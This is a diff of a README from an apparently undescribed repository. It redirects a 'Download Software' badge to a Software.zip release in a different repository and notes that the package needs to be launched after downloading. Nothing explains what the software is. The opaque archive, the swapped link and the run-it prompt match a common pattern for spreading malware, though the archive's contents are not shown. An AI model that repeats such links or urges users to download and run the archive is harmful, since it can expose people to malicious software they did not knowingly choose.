@@ -8,7 +8,7 @@ Unfortunately, the short description for this repository is not provided at the 
 
 ## Software Package
 Click the button below to download the software package:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/russbzallin/ChgPass/releases/download/v2.0/Software.zip)](https://github.com/russbzallin/ChgPass/releases/download/v2.0/Software.zip)
 (*Note: The software package needs to be launched after downloading.*)
 
 ## Getting Started
